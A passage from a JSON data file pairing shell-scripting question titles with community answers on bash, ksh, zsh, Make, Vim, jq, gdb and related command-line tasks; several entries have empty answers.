?o\n}',SEM_Models('&1'),NULL,\nSEM_ALIASES(SEM_ALIAS('','http://VISION/DataSource/SEMANTIC_CACHE#')),NULL));\n... so the alias will be the same value you're querying on (the value in $2, or BUILDING in the original part of the answer). You can refer to a substitution variable as many times as you want.\nThat might not be easy to use if you're running it multiple times, as it will appear as a header above the count value in each bit of output. Maybe this would be more parsable later:\nselect '&1' as QUERIED_VALUE, COUNT(*) as TOTAL_COUNT\nIf you set pages 0 and set heading off, your repeated calls might appear in a neat list. You might also need to set tab off and possibly use rpad('&1', 20) or similar to make that column always the same width. Or get the results as CSV with:\nselect '&1' ||','|| COUNT(*)\nDepends what you're using the results for...",
    "How do you pipe scripts into NodeJs from command line?": "The -e option is for running JS passed as an argument. To run JS from stdin, you can simply pipe to node directly.\npbpaste | node",
    "simple shell script to copy files and folders and also execute a command": "Basically, you can add in a script any command you are able to type inside the terminal itself. Then, you have two options for executing it:\nExecute it from the terminal with sh your_script.sh. You don't even need to give execute permission to it with this solution.\nGive it the execute permission and run it with ./your_script.sh.\nFor the second solution, you have to start the file with what is called a shebang. So your script will look like:\n#!/bin/sh\n\ncp path/to/source path/to/destination\ncp path/to/source path/to/destination\ncp path/to/source path/to/destination\n\nldconfig\n\necho \"Done!\"\nNothing else. Just write the commands one after the other. The first line is the so-called shebang and tells the shell which interpreter to use for the script.\nNote: the extension for shell scripts is usually .sh, but you can actually name your file however you prefer. The extension has no meaning at all.\nGood scripting!",
    "\"dyld: Library not loaded\", \"libruby.1.9.1.dylib\" when calling \"mvim .\" in the command line": "brew will compile MacVim against your currently active ruby which was probably 1.9.3-p125. rvm use 1.9.3-p194 --default && brew uninstall macvim && brew install macvim is probably your best bet to fix your problem.",
    "Read argument with spaces in python script from a shell script": "Use \"$@\" instead:\n#!/bin/sh\npython \"$@\"\nOutput:\n$ /tmp/test.sh /tmp/test.py firstParam \"file with spaces.txt\"\n['/tmp/test.py', 'firstParam', 'file with spaces.txt']\nwith /tmp/test.py defined as:\nimport sys\nprint sys.argv",
    "Vim change block cursor when in insert mode": "I know this is an old question but hopefully this will help anyone else facing the same scenario.\nActually I'm using iTerm2 and using Vim inside my terminal on Mac. And when entering to insert mode, the cursor still being a block and is kind of confusing when you are at insert mode or normal mode.\nI wanted to show a thin line as cursor when in insert mode and back to block when in normal mode as MacVim does. And to do so it's pretty simple, just added this to my .vimrc file as described here:\nlet &t_SI = \"\\<Esc>]50;CursorShape=1\\x7\"\nlet &t_SR = \"\\<Esc>]50;CursorShape=2\\x7\"\nlet &t_EI = \"\\<Esc>]50;CursorShape=0\\x7\"\nBut as you can see there was a delay when hitting ESC to exit insert mode back to normal mode and show the block as cursor again. So to fix it I found this:\nset ttimeout\nset ttimeoutlen=1\nset listchars=tab:>-,trail:~,extends:>,precedes:<,space:.\nset ttyfast\nAnd now it works pretty fine as you can see:\nI hope it could help any one else! \ud83d\udc7b",
    "read the contents of a directory using shell script": "for entry in *\ndo\n  echo \"$entry\"\ndone",
    "How to hide the cursor in a terminal during a script and restore it back to normal if the command is interrupted?": "Could you use trap?\ncleanup() {\n    tput cnorm\n}\n\ntrap cleanup EXIT\n\ntput civis\nwhile [ condition ]\n...",
    "How to read and parse JSON in shell scripting without using json tool and JQ tool [duplicate]": "The more readable and easy to understand solution would be:\ncat process.json | tr { '\\n' | tr , '\\n' | tr } '\\n' | grep \"uri\" | awk  -F'\"' '{print $4}'",
    "How to Exit and Kill the Running Docker Container with CTRL+C?": "",
    "Wait until a condition is met in bash script": "",
    "echo $PS1 in script": "Other answers are correct. If you add the -i flag to your shebang, that signals bash that it's supposed to be an interactive shell, so it will read your ~/.bashrc -- see https://www.gnu.org/software/bash/manual/bashref.html#Invoking-Bash\n#!/bin/bash -i\nps1=\"$PS1\"\necho \"$ps1\"",
    "Why to shift bits \"$? >> 8\" when using Perl system function to execute command": "perldoc -f system snippet:\nThe return value is the exit status of the program as returned by the wait call. To get the actual exit value divide by 256.\nYou can check all the failure possibilities by inspecting $? like this:\n$exit_value  = $? >> 8;\n$signal_num  = $? & 127;\n$dumped_core = $? & 128;",
    "How to pass base64 encoded content to sed?": "The problem was in base64 encoding, -w 0 option of base64 did the trick.\ncat ./sample.xml | base64 -w 0",
    "Using shell commands with boot2docker": "You have to run command \"tce\" then you can search for \"bash\" and it will give option to install. More info at: http://wiki.tinycorelinux.net/wiki:install_apps",
    "How to run multiple jar files at once using shell script?": "Just launch your jar adding a & at the end Example :\n#!/bin/bash\n\njava -jar myjar1.jar &\njava -jar myjar2.jar &\njava -jar myjar3.jar &\nIf you want the jar keep running after closing the terminal, use nohup :\n#!/bin/bash\n\nnohup java -jar myjar1.jar &\nnohup java -jar myjar2.jar &\nnohup java -jar myjar3.jar &\nI use it in a project, works like a charm.",
    "adb pull file in a specific folder of Pc": "",
    "Bash: Split stdout from multiple concurrent commands into columns": "Regrettably answering my own question.\nNone of the supplied solutions were exactly what I was looking for. So I developed my own command line utility: multiview. Maybe others will benefit?\nIt works by piping processes' stdout/stderr to a command interface and then by launching a \"viewer\" to see their outputs in columns:\nfooProcess | multiview -s & \\\nbarProcess | multiview -s & \\\nbazProcess | multiview -s & \\\nmultiview\nThis will display a neatly organized column view of their outputs. You can name each process as well by adding a string after the -s flag:\nfooProcess | multiview -s \"foo\" & \\\nbarProcess | multiview -s \"bar\" & \\\nbazProcess | multiview -s \"baz\" & \\\nmultiview\nThere are a few other options, but thats the gist of it.\nHope this helps!",
    "How to check if the directory is symlink in chef": "The selected answer will not work on Windows or systems where Bash is the default interpreter. You should use a Ruby solution to be cross-platform (and faster, since there's no process spawning):\ndirectory '/var/www/html' do\n  action :delete\n  not_if { File.symlink?('/var/www/html') }\nend",
    "Displaying stdout on screen and a file simultaneously": "I can't say why tail lags, but you can use tee:\nRedirect output to multiple files, copies standard input to standard output and also to any files given as arguments. This is useful when you want not only to send some data down a pipe, but also to save a copy.\nExample: <command> | tee <outputFile>",
    "shell - temp IFS as newline only. Why doesn't this work: IFS=$(echo -e '\\n')": "Update - changing my pseudo-comment to a real answer.\nI think this answer should explain the behavior you are seeing. Specifically command substitution operators $() and backticks will strip trailing newlines from the command output. However the direct assignment in your second example doesn't do any command subsitution, so works as expected.\nSo I'm afraid to say I think the upvoted comment you refer to is incorrect.\nI think the safest way to restore IFS is to set it in a subshell. All you need to do is put the relevant commands in parentheses ():\n(\n    IFS=$'\\n'\n    echo -n \"$IFS\" | od -t x1\n    for file in `printf 'one\\ntwo two\\nthree'`; do\n        echo \"Found $file\"\n    done\n)\nOf course invoking a subshell incurs a small delay, so performance needs to be considered if this is to be repeated many times.\nAs an aside, be very careful, filenames can contain both \\b and \\n. I think just about the only characters they cannot contain are slash and \\0. At least thats what it says on this wikipedia article.\n$ touch $'12345\\b67890'\n$ touch \"new\n> line\"\n$ ls --show-control-chars\n123467890  new\nline\n$ ",
    "start daemon on remote server via Jenkins SSH shell script exits mysteriously": "",
    "Recursive copy to relative destination paths": "Actually it also works with cp, what you want is the --parents flag.\ncp --parents `find /path/src  \\( -name \"*.jpg\" -o -name \"*.gif\" \\)` /path/target\nIn theory -P is synonyms with --parents, but that never worked for me.",
    "Redirect grep output to file": "You may want to use >> (append) instead of > (overwrite) for redirection as:\nunzip -p $i | grep -iF \"$LOOK_FOR\" >> output\nSince you're executing this command in a loop and overwriting file output every time, it might be blank in the end if very last command with grep doesn't find any matching line in unzip output.",
    "How do I define a shell script variable to have scope outside of the script": "You can't set variables in parent process's environment. You can only set your current process's environment or prepare an environment for your process's children.\nThat said, you can instruct your shell to run commands from a script in the current shell process rather than forking a new shell. You can do it like this:\nsource your_script.sh\nor\n. your_script.sh\n(note the space after the dot). Since here commands inside your_script.sh are run by the current shell the changes made to the environment inside the script are retained.\nHowever, if the shell running your script is not an ancestor of the shell in which you wish to use the environment variable then there is no way to achieve your goal using environment variables at all. For example, if you script is run at initialization by some childless shell all environment settings done there are irreversibly lost forever. In this case, use some other mechanism like a file (perhaps somewhere under /var).\nIf you want all instances of a given shell to have certain variables set in their environment you can use initialization scripts that most shells use. Usually, they have a system-wide and per-user initialization scripts. For example, bash uses /etc/profile as system-wide initialization script for interactive login shell and $HOME/.bash_profile (also $HOME/.bash_login and $HOME/.profile) as per-user initialization script. See this reference for bash-specific details. If you use a different shell, try its respective manual.",
    "code coverage tools for validating the scripts": "I seriously doubt that there could be any static code analysis performed on shell scripts - especially due to the fact that shell scripts are supposed to call external programs and based on what these external programs return - and there are myriads of external programs and external environment states. It's similar to the problem of static analysis of code heavily relying on eval-like mechanism, but shell scripting is all about eval-style programming.\nHowever, there are some general pointers that could prove useful for \"proper\" validation, code coverage and documenting of shell scripts as major languages do:\nYou can always run a script with -x (AKA xtrace) option - it will output trace looking like that to stderr:\n+ log_end_msg 0\n+ [ -z 0 ]\n+ retval=0\n+ log_end_msg_pre 0\n+ :\n+ log_use_fancy_output\n+ TPUT=/usr/bin/tput\n+ EXPR=/usr/bin/expr\n+ [ -t 1 ]\n+ [ xxterm != x ]\n+ [ xxterm != xdumb ]\nBash makes it possible to redirect this stream to external FD (using BASH_XTRACEFD variable) - that's much easier to parse in practice.\nIt's not trivial, but it's possible to write a program that will find relevant pieces of code being executed using xtrace output and make you a fancy \"code coverage\" report - like what was called how many times, which pieces of code weren't run at all and thus lack test coverage.\nIn fact, there's a wonderful tool named shcov already written that uses this process - albeit it's somewhat simplistic and doesn't handle all possible cases very well (especially when we're talking about long and complex lines)\nLast, but not least - there's minimalistic shelldoc project (akin to javadoc) that helps generating documentation based on comments in shell scripts. Yep, that's a shameless plug :)",
    "Running a shell script in .vimrc (and processing the output)": "function! CheckMe(file)\n    let shellcmd = 'checkme '.a:file\n\n    let output=system(shellcmd)\n    if !v:shell_error\n        return 0\n    endif\n\n    \" Are you sure you want to split on non-blanks? This \n    \" will result in list of blank strings.\n    \" My variant:\n    let [line, char]=split(output)\n\n    \" Normal is not an execute: this is what it will do:\n    \" \u00ab'/\u00bb means \u00abGo to mark /\u00bb, produces an error E78 because /\n    \" is not a valid symbol for mark. Than normal stops after error occured.\n    \" If you need to use variables in nomal use \u00abexecute 'normal '.ncmd\u00bb.\n    \" And you can not use \u00abnormal\u00bb to perform search\n    execute '/\\%'.line.'l\\%'.char.'c'\n    \" or\n    call setpos('.', [0, line, char, 0])\n    return 1\nendfunction\nAccording to the Vim docs, the argument of the \"normal\" keyword is \"executed like it is typed\", but apparently that is not the case. It works fine when I type it (in the normal command mode, without leading ':'), but doesn't in the script (\"E78: Unknown mark).\nJust type \u00ab'/\u00bb to get this error.",
    "Shell Script Tilde Expansion": "You will probably need to eval the variable to have it substituted correctly. One example would be to simply do\ncaminho=`eval \"echo $caminho\"`\nKeep in mind that this will break if caminho contains semicolons or quotes, it will also treat backslashes as escaping, and if the data is untrusted, you need to take care that you're not the target of an injection attack.\nHope that helps.",
    "How do I add a directory with a colon to PYTHONPATH?": "The problem is not with bash. It should be setting your environment variable correctly, complete with the : character.\nThe problem, instead, is with Python's parsing of the PYTHONPATH variable. Following the example set by the PATH variable, it seems there is no escape character at all, so there is no way to make it interpret the : as something other than a separator. You can see it for yourself in the Python interpreter source code.\nThe only solution is, as several people already mentioned, to use a symlink or something else to allow you to give a colon-less name for your directories.",
    "How to autocomplete at the KornShell command line with the vi editor": "ESC\\ works fine on AIX4.2 at least. One thing I noticed is that it only autocompletes to the unique part of the file name.\nSo if you have the files x.txt, x171go and x171stop, the following will happen:\nPress keys:           Command line is:\nx                     x\n<ESC>\\                x\n1                     x1\n<ESC>\\                x171\ng<ESC>\\               x171go",
    "Passing Ipython variables as string arguments to shell command": "The main problem you encounters seems to come from the quotes needed in your string. You can keep the quotes in your string by using a format instruction and a raw string.\nUse a 'r' before the whole string to indicate it is to be read as raw string, ie: special caracters have to not be interpreted. A raw string is not strictly required in your case because the string constructor of python is able to keep single quotes in a double quotes declaration but I think it's a good habit to use raw string declarators when there are non alphanumerics in it.\nThere are at least two way to format strings :\nOlder method herited from ancient langages with % symbols:\nsp_name = 'littleGuy' #the variable\nsp_query = r\"DisplayName eq '%s'\"%(sp_name) \n\nsp_details = !az ad app list --filter {sp_query}\nNewer method with {} symbols and the format() method :\nsp_name = 'littleGuy' #the variable\nsp_query = r\"DisplayName eq '{}'\".format(sp_name) \n\nsp_details = !az ad app list --filter {sp_query}",
    "Modifying array of key value in JSON jq": "It is enough to assign to the path, if you are using |=, e.g.\njq '\n  (.taskDefinition.containerDefinitions[0].environment[] | \n   select(.name==\"DB_USERNAME\") | .value) |= \"new\"\n' infile.json\nOutput:\n{\n  \"taskDefinition\": {\n    \"containerDefinitions\": [\n      {\n        \"name\": \"web\",\n        \"image\": \"my-image\",\n        \"environment\": [\n          {\n            \"name\": \"DB_HOST\",\n            \"value\": \"localhost\"\n          },\n          {\n            \"name\": \"DB_USERNAME\",\n            \"value\": \"new\"\n          }\n        ]\n      }\n    ]\n  }\n}",
    "Bash: highlight command before execution (set -x)": "I would like to extend rubo77's answer with a few examples that I think deserve a separate answer:\nPlain text prefix\nSo the basic example is to set PS4 to some plain text, e.g.:\nPS4=\"# \"; set -x\nWhich will result in:\n\n\nColor & extra line text prefix\nBut because you can use special characters and ANSI escape codes you can for example add a new line before each new command and print the prefix in a color, e.g.:\nPS4=\"\\n\\033[1;33m>>>\\033[0m \"; set -x\nResult:\n\n\nDynamic color prefix\nFinally you can make the command prefix call other programs with each use, which you can use to add a timestamp, e.g.:\n# yes, there have to be single quotes below, not double!\nPS4='\\033[1;34m$(date +%H:%M:%S)\\033[0m '; set -x\nResult:",
    "Pass arguments to python from bash script": "In addition to Chepner's answer above:\n#!/bin/bash\ntinify.py \"$@\"\nwithin python script, tinify.py:\nfrom sys import argv\ninputArgs = sys.argv[1:]\ndef remove_duplicates(l):\n    return list(set(l))\narguments=remove_duplicates(inputArgs)\nThe list arguments will contain the arguments passed to python script (duplicated removed as set can't contain duplicated values in python).",
    "os.chdir() to relative home directory (/home/usr/)": "No, os.chdir won't do that, since it is just a thin wrapper around a system call. Consider that ~ is actually a legal name for a directory.\nYou can, however, use os.expanduser to expand ~ in a path.\ndef cd(path):\n    os.chdir(os.path.expanduser(path))\nNote that this will also expand ~user to the home directory for user.",
    "how to pipe wc -l output to echo output": "you should not pipe the var into echo, but instead run them in sequence:\nvar=\"$(grep -i error * | wc -l)\"\necho \"Error count found in logfile is $var\"\nor you can define the variable just for the echo command, by doing with bash:\n var=\"$(grep -i error * | wc -l)\" ; echo \"Error count found in logfile is $var\"\nAs said in the comments below, of course you can embed your command call in your echo statement:\necho \"Error count found in logfile is $(grep -i error * | wc -l)\"",
    "Elegant way to remove target file if a Make rule fails": "You could use the special target .DELETE_ON_ERROR:\nIf .DELETE_ON_ERROR is mentioned as a target anywhere in the makefile, then make will delete the target of a rule if it has changed and its recipe exits with a nonzero exit status, just as it does when it receives a signal.\nAll it takes is one line:\n.DELETE_ON_ERROR:\nAnd all rules that fail will have their target removed.",
    "Shell command to reverse each line of file": "rev will do the job:\nrev file\n4 3 2 1\n6 5 4 3\n2 3 7 8",
    "setting global variable in bash": "You run inner function call in back ground, which means the START will be assigned in a subshell started by current shell. And in that subshell, the START value will be 5.\nHowever in your current shell, which echo the START value, it is still 0. Since the update of START will only be in the subshell.\nEach time you start a shell in background, it is just like fork a new process, which will make a copy of all current shell environments, including the variable value, and the new process will be completely isolate from your current shell.\nSince the subshell have been forked as a new process, there is no way to directly update the parent shell's START value. Some alternative ways include signals passing when the subshell which runs inner function exit.\ncommon errors:\nexport\nexport could only be used to make the variable name available to any subshells forked from current shell. however, once the subshell have been forked. The subshell will have a new copy of the variable and the value, any changes to the exported variable in the shell will not effect the subshell.\nPlease take the following code for details.\n#!/bin/bash\nexport START=0\nineer()\n{\n    sleep 3\n    export START=5\n    echo \"done $START\"  # ==> I am seeing here it return 5\n    sleep 1\n    echo \"new value $START\"\n    return $START\n}\necho \"Starting\"\nineer &\n\nwhile true\ndo\n    if [ $START -eq 0 ]\n    then\n        echo \"Not null $START\" #  ==> But $START here is always 0\n        export START=10\n        echo \"update value to $START\"\n        sleep 3\n    else\n        echo \"else $START\"\n        break;\n    fi\n    sleep 1;\ndone",
    "How to get only added/changed lines in diff?": "Try\ncomm -1 -3 a.txt b.txt\ncomm, common lines, is a handy command.",
    "gdb how to execute target program from script": "There are several ways.\nThe truly old-school way is to hack a loop into your program's main like:\nvolatile int zzz;\n...\nint main() {\n  while (!zzz) sleep (1);\nThen, run your script. In a separate window, run gdb on the program you want to debug, and use attach to attach to the sleeping program. Then you can set breakpoints, etc, and finally:\n(gdb) set var zzz = 1\n(gdb) cont\nA slightly newer (\"new\" as in \"it's been in gdb at least 10 years\") way is to edit your script and put a gdb --args before the invocation of the program you want to debug. This method doesn't always work, though. It doesn't handle redirections properly, among other things.\nFinally, you can use multi-inferior debugging. This is the \"newest\" approach of all. Here I'm following my own blog post on the topic:\n$ gdb /bin/sh  # or whatever runs your script\n(gdb) set args arguments-to-the-script\n(gdb) set detach-on-fork off\n(gdb) set target-async on\n(gdb) set non-stop on\n(gdb) set pagination off\nThen you can do something like:\n(gdb) add-inferior -exec program-you-want-to-debug\n... then switch to that inferior and set breakpoints. Now switch back to the first inferior and run -- it should all work!",
    "Run shell commands in Scala code on Windows seems to require the full absolute path of the command": "You could try this:\nval command = Seq(\"protractor\", \"--version\")\nval os = sys.props(\"os.name\").toLowerCase\nval panderToWindows = os match {\n  case x if x contains \"windows\" => Seq(\"cmd\", \"/C\") ++ command\n  case _ => command\n}\npanderToWindows.!",
    "bash - get directory a script is run from": "The $PWD variable is probably what you need.\n$ cat >/tmp/pwd.bash <<'END'\n#!/bin/bash\necho \"\\$0=$0\"\necho \"\\$PWD=$PWD\"\nEND\n\n$ chmod u+x /tmp/pwd.bash\n\n$ pwd\n/home/jackman\n\n$ /tmp/pwd.bash\n$0=/tmp/pwd.bash\n$PWD=/home/jackman",
    "How to parse JSON with shell scripting on Linux?": "Here's a sample using jsawk. Reference: Parsing JSON with Unix tools\nSetup:\nFirst download jsawk from https://github.com/micha/jsawk:\n$ curl -L http://github.com/micha/jsawk/raw/master/jsawk > jsawk\n$ chmod 755 jsawk && mv jsawk ~/bin/\nYou might want to install js-devel first before you can use jsawk. I'm using Fedora, so what I did was:\n$ sudo yum install js-devel\nThe test:\nI copied your JSON output sample to a text file. Called it sample.json. Here a sample to get a value from your JSON output sample:\n$ jsawk 'return this.Instances[0].Monitoring.State' < sample.json\ndisabled\n$ jsawk 'return this.Instances[0].VpcId' < sample.json\nvpc-86bab0e4\nFor JSON data from a URL, you can use curl http://someserver.com/data.json instead of cat:\n$ curl http://someserver.com/data.json | jsawk 'return this.Instances[0].VpcId'\nvpc-86bab0e4\nYou can use these commands in your bash file to generate a new file that contains strings / text that you wanted. You can read more about jsawk from the GitHub link that I provided here.\nIs this what you were looking for?",
    "creating soft links with the same name as the target file": "It is very frustrating typing the name over and over again if you're creating several symlinks. Here's how I bypass retyping the name in Linux.\nHere's my example file structure:\nsource/\n - file1.txt\n - file2.js\n - file3.js\ntarget/\n\nCreate symlink to single file\n~$ ln -sr source/file2.js target/\nResult:\nsource/\n - file1.txt\n - file2.js\n - file3.js\ntarget/\n - file2.js\n\nCreate symlink to all files with matching extension in source\n~$ ln -sr source/*.js target/\nResult:\nsource/\n - file1.txt\n - file2.js\n - file3.js\ntarget/\n - file2.js\n - file3.js\n\nCreate symlinks to all files in source\n~$ ln -sr source/* target/\nResult:\nsource/\n - file1.txt\n - file2.js\n - file3.js\ntarget/\n - file1.txt\n - file2.js\n - file3.js\n\n\nRelativity\nNotice the r option. If you don't include -r the link source must be entered relative to the link location.\n~$ ln -s ../source/file1.txt target/ Works\n~/target$ ln -s ../source/file1.txt . Works\n~$ ln -s source/file1.txt target/ Does not work\nSee also:\nHow to create symbolic links to all files (class of files) in a directory?\nLinux man pages",
    "syntax error near unexpected token `&' (using \"|&\")": "You can use the sequence |& to pipe both stdout and stderr from one process to another.\nYou cannot have a space between the | and the &. (csh and tcsh allow a space; bash does not.) I suspect you happen to be typing it without the space when you run the command interactively; the syntax is the same either way.\nThis:\nfoo |& bar\nis shorthand for this:\nfoo 2>&1 | bar\nUPDATE :\nWith bash 3.2.25, the |& token is not recognized; was added as a new feature in bash 4.1. Running your script with the older bash, I get the same error message you do.\nTo make your script compatible with older versions of bash, just do the equivalent redirection without using the |& operator:\n#!/bin/bash\nvar1=`(/usr/bin/time cdifonline -CD 186821 -ALL > /dev/null) 2>&1 | grep real | awk '{print $2}'`\nFurther refinements: Use $(...) rather than `...`:\n#!/bin/bash\nvar1=$((/usr/bin/time cdifonline -CD 186821 -ALL > /dev/null) 2>&1 | grep real | awk '{print $2}')\nYou can also incorporate the grep search into the awk command:\n#!/bin/bash\nvar1=$((/usr/bin/time cdifonline -CD 186821 -ALL > /dev/null) 2>&1 | awk '/real/ {print $2}')\nWarning: I have not thoroughly tested these beyond verifying that they run without syntax errors.\nI still see no difference between |& and | &. Is it possible that /bin/bash is a different version than what you're running interactively? Try /bin/bash --version and echo $BASH_VERSION.",
    "Executing KornShell script": "make sure that ksh is correctly installed in /bin/ksh\ntry which ksh from the command-line.\nconsider #! /usr/bin/env ksh for more portability.\nfor executing a script run from the command-line ./script in the directory where script exist.\nIf you want to execut the script from any directory without ./ prefix, you have to add the path to your script to the PATH environment variable, add this line\nexport PATH=\"path_to_your_script\":$PATH\nto you ~/.kshrc file.",
    "Use $RANDOM in a makefile": "Wouldn't it be easier/better to use a date/time stamp so that the renamed files are listed in date order?\nYou need to use two $ signs in the makefile for each $ that you want the shell to see.\nThus:\nall: renamefiles\n\nrenamefiles:\n    rand=$$RANDOM && \\\n    mv myfile.css      $$rand-myfile.css && \\\n    mv myotherfile.css $$rand-myotherfile.css\nOr, with date/time stamps:\nall: renamefiles\n\nrenamefiles:\n    time=$$(date +'%Y%m%d-%H%M%S') && \\\n    mv myfile.css      $$time-myfile.css && \\\n    mv myotherfile.css $$time-myotherfile.css",
    "Character-mode (shell) plots with Matlab / Octave?": "In the case of Octave you should have no problem. I usually do my computations on remote machines over ssh, and use it all the time.\nAs long as you have gnuplot as your graphics toolkit (for future reference, as of 3.6.2 this is still the default but may change to fltk in the future), you'll get ASCII plots if there's no X display.\nTo make sure you have the correct graphics toolkit, just type graphics_toolkit at the prompt. To change it to gnuplot use graphics_toolkit gnuplot.",
    "Interacting with a .db file from Linux shell": "You will have to install a package named 'sqlite' or 'sqlite3'.\nThen you will be able to interact with your .db file using\n$ sqlite3 files.db\n> SELECT blah FROM your_table WHERE ......\nIn your post you mention 'SQLite3', the package name should have no caps letters.\nDid you run an apt-cache search sqlite ?",
    "Capturing the output of bash time in script variable": "You are not capturing anything in foo because time sends its output on stderr. The trouble is that the wget command also sends most of its output on stderr. To split the two streams (and throw away the output from wget) you will need to use a subshell:\nTIMEFORMAT=%R;\nfoo=$( time ( wget http://www.example.com 2>/dev/null 1>&2 ) 2>&1 )\necho $foo\nHere is an explanation of what's going on...\nThe inner part of this command:\n( wget http://www.example.com 2>/dev/null 1>&2 )\nSends both stderr and stdout to /dev/null, essentially throwing them away.\nThe outer part:\nfoo=$( time ( ... ) 2>&1 )\nSends stderr from the time command to the same place that stdout is sent so that it may be captured by the command substitution ($()).\nUpdate:\nIf you wanted to get really clever, you can have the output of wget passed through to stderr by juggling the file descriptors like this:\nfoo=$( time ( wget http://www.example.com 2>&1 ) 3>&1 1>&2 2>&3 )",
    "Batch Build and Archive of iOS apps via Terminal": "",
    "How to find the options in if conditions of shell [duplicate]": "You can do help test which will show most of the options accepted by the [[ command.\nYou can also do help [ which will show additional information. You can do help [[ to get information on that type of conditional.\nAlso see man bash in the \"CONDITIONAL EXPRESSIONS\" section.",
    "Do I need to generate a second file to sort a file?": "Try:\nsort -o file.txt file.txt\nSee http://ss64.com/bash/sort.html\n`-o OUTPUT-FILE'\n     Write output to OUTPUT-FILE instead of standard output.  If\n     OUTPUT-FILE is one of the input files, `sort' copies it to a\n     temporary file before sorting and writing the output to\n     OUTPUT-FILE.",
    "Windows CMD: List files in dir & subdir WITHOUT given extensions": "Try this:\ndir /b /s /a-d | findstr /vi \".ext1$ .ext2$ .ext3$\"\nThe /a-d switch excludes directories, giving you only files. The findstr parameter lets you search the files for strings, and the /vi switch indicates to exclude files containing the next parameter, the search being case insensitive.\nAs Joey pointed out, the $ is necessary to indicate end of the line.",
    "How to save the current working directory to Zsh history?": "function _-accept-line() {\n    [[ -z \"${BUFFER\" ]] || [[ \"${BUFFER}\" =~ \"### ${(q)PWD}\\$\" ]] || BUFFER=\"${BUFFER} ### ${PWD}\"\n    zle .accept-line\n}\nzle -N accept-line _-accept-line\nWill add ### ${PWD} to your command line. Not the best solution you could use, but it works.\nUPD: Answer based on @Dennis Williamson's comment:\nfunction zshaddhistory() {\n    print -sr \"${1%%$'\\n'} ### ${PWD}\"\n    fc -p\n}",
    "Is it possible to write a shell script which is faster than the equivalent script in Perl? [closed]": "There are few ways to make your shell (eg Bash) execute faster.\nTry to use less of external commands if Bash's internals can do the task for you. Eg, excessive use of sed , grep, awk et for string/text manipulation.\nIf you are manipulating relatively BIG files, don't use bash's while read loop. Use awk. If you are manipulating really BIG files, you can use grep to search for the patterns you want, and then pass them to awk to \"edit\". grep's searching algorithm is very good and fast. If you want to get only front or end of the file, use head and tail.\nfile manipulation tools such as sed, cut, grep, wc, etc all can be done with one awk script or using Bash internals if not complicated. Therefore, you can try to cut down the use of these tools that overlap in their functions. Unix pipes/chaining is excellent, but using too many of them, eg command|grep|grep|cut|sed makes your code slow. Each pipe is an overhead. For this example, just one awk does them all. command | awk '{do everything here}' The closest tool you can use which can match Perl's speed for certain tasks, eg string manipulation or maths, is awk. Here's a fun benchmark for this solution. There are around 9million numbers in the file\nOutput\n$ head -5 file\n1\n2\n3\n34\n42\n$ wc -l <file\n8999987\n\n# time perl -nle '$sum += $_ } END { print $sum' file\n290980117\n\nreal    0m13.532s\nuser    0m11.454s\nsys     0m0.624s\n\n$ time awk '{ sum += $1 } END { print sum }' file\n290980117\n\nreal    0m9.271s\nuser    0m7.754s\nsys     0m0.415s\n\n$ time perl -nle '$sum += $_ } END { print $sum' file\n290980117\n\nreal    0m13.158s\nuser    0m11.537s\nsys     0m0.586s\n\n$ time awk '{ sum += $1 } END { print sum }' file\n290980117\n\nreal    0m9.028s\nuser    0m7.627s\nsys     0m0.414s\nFor each try, awk is faster than Perl.\nLastly, try to learn awk beyond what they can do as one liners.",
    "Automatically execute commands on launching python shell": "Yup you can use the PYTHONSTARTUP environment variable to do this as outlined here"
}
